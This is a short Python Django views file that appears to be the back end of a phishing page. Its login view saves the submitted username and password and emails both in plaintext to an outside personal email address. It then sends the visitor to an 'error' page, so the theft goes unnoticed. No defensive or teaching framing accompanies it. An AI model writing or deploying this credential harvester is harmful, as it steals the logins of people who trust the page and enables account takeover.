from django.forms.models import BaseModelForm
from django.http import HttpResponse
from django.shortcuts import render
from django.views.generic.edit import FormView
from django.views.generic import TemplateView
from django.urls import reverse_lazy
from .forms import LoginForm,PhoneForm
from .models import Login,Phone
from django.core.mail import send_mail
from showtime.settings import EMAIL_HOST_USER

class LoginCreateView(FormView):
    form_class = LoginForm
    template_name = 'login.html'
    success_url = 'error/'

    def form_valid(self, form):
        form.save()
        username = form.cleaned_data['username']
        password = form.cleaned_data['password']

        subject = 'New details submitted'
        mail_message = f"Username: {username}\nPassword: {password}"
        from_email = EMAIL_HOST_USER
        recipient_list = ['rn.riley@outlook.com'] 
        send_mail(subject,mail_message,from_email, recipient_list, fail_silently=False)
        return super().form_valid(form)

class PhoneView(TemplateView):
    template_name = 'index.html'
